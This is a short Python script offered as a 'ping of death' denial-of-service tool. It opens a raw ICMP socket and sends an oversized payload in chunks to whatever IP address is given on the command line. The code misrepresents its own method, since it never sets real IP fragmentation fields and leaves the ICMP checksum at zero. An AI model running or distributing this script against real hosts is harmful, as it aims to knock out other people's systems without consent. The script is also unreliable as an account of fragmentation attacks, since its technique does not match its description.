#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    ping of death using fragmentation packet method
"""

import socket
import struct
import sys

PAYLOAD = b"A" * 70000
MAX_FRAGMENT_SIZE = 65500

def create_icmp_header():
    #construct an ICMP echo request packet
    icmp_type = 8       # echo request
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = 1
    icmp_seq = 1
    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    return header

def fragmentation_packet(target_ip):
    header = create_icmp_header()
    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    for i in range(0, len(PAYLOAD), MAX_FRAGMENT_SIZE) :
        chunk = PAYLOAD[i:i + MAX_FRAGMENT_SIZE]
        packet = header + chunk
        try:
            sock.sendto(packet, (target_ip, 0))
            print(f"Fragment {i // MAX_FRAGMENT_SIZE + 1} send to {target_ip}.")
        except Exception as e:
            print(f"Error sending fragment: {e}")

def main():
    if len(sys.argv) != 2:
        print("SYNTAX: file-name [target_ip]")
        return

    target_ip = sys.argv[1]
    fragmentation_packet(target_ip)
    
if __name__ == "__main__":
    main()

